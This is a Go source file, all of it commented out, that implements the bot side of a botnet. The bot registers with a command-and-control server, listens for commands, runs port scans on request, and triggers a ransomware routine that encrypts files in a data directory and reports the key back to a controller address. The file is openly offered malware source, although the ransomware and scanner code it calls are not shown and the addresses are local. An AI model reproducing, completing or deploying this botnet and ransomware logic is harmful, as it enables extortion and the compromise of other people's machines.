package tcp

// type BotService struct {
// }

// //NewBot is
// func NewBot(ccAddr string) (*Bot, error) {
// 	conn, err := net.Dial("tcp", ccAddr)
// 	if err != nil {
// 		return nil, fmt.Errorf("%s is not available", ccAddr)
// 	}
// 	defer conn.Close()

// 	bot := &Bot{
// 		ID:   uuid.NewV4().Bytes(),
// 		Host: strings.Split(conn.LocalAddr().String(), ":")[0],
// 		Port: strings.Split(conn.LocalAddr().String(), ":")[1],
// 	}

// 	buff, err := bot.Bytes()
// 	if err != nil {
// 		log.Panic(err)
// 	}

// 	data := append(commandToBytes("genesis"), buff...)

// 	_, err = io.Copy(conn, bytes.NewReader(data))
// 	if err != nil {
// 		log.Panic(err)
// 	}

// 	return bot, nil
// }

// //Listen is
// func (b *Bot) Listen() {
// 	addr := fmt.Sprintf("%s:%s", b.Host, b.Port)
// 	listener, err := net.Listen("tcp", addr)
// 	if err != nil {
// 		Err(err, "listening on addr", addr)
// 		os.Exit(1)
// 	}

// 	Msg("listening on", addr)

// 	b.acceptConnections(listener)
// }

// func (b *Bot) acceptConnections(l net.Listener) {
// 	for {
// 		conn, err := l.Accept()
// 		if err != nil {
// 			Err(err, "accepting connection")
// 			continue
// 		}

// 		go b.handleConnection(conn)
// 	}
// }

// func (b *Bot) handleConnection(conn net.Conn) {
// 	var req bytes.Buffer
// 	if _, err := io.Copy(&req, conn); err != nil {
// 		log.Panic(err)
// 	}

// 	command := bytesToCommand(req.Bytes()[:commandLength])

// 	switch command {
// 	case "ransomware":
// 		b.handleRansomware(req.Bytes()[commandLength:])
// 	case "scan":
// 		b.handleScan(req.Bytes()[commandLength:])
// 	}

// 	conn.Close()
// }

// func (b *Bot) handleScan(payload []byte) {
// 	hosts := []string{"127.0.0.1"}
// 	ports := []string{"8000", "1", "2", "22"}
// 	s := NewScanner(hosts, ports, 50)

// 	resCh := s.Scan()
// 	var res []string
// 	for addr := range resCh {
// 		fmt.Println("addr found", addr)
// 		res = append(res, addr)
// 	}
// }

// func (b *Bot) handleRansomware(payload []byte) {
// 	r, err := NewRansomware("../../data")
// 	if err != nil {
// 		log.Panic(err)
// 	}
// 	if err := r.Exec(); err != nil {
// 		log.Panic(err)
// 	}
// 	msg := &RansomCompleteRequest{
// 		BotID: b.ID,
// 		Key:   r.Key,
// 	}
// 	by, err := Bytes(msg)
// 	if err != nil {
// 		log.Panic(err)
// 	}
// 	data := append(commandToBytes("rancom"), by...)
// 	sendData("127.0.0.1:7890", data)
// }

// //Bytes is
// func (b *Bot) Bytes() ([]byte, error) {
// 	buff := new(bytes.Buffer)
// 	if err := gob.NewEncoder(buff).Encode(b); err != nil {
// 		return nil, err
// 	}

// 	return buff.Bytes(), nil
// }

// //BytesToBot is
// func BytesToBot(b []byte) (*Bot, error) {
// 	bot := new(Bot)
// 	if err := gob.NewDecoder(bytes.NewReader(b)).Decode(bot); err != nil {
// 		return nil, err
// 	}
// 	return bot, nil
// }
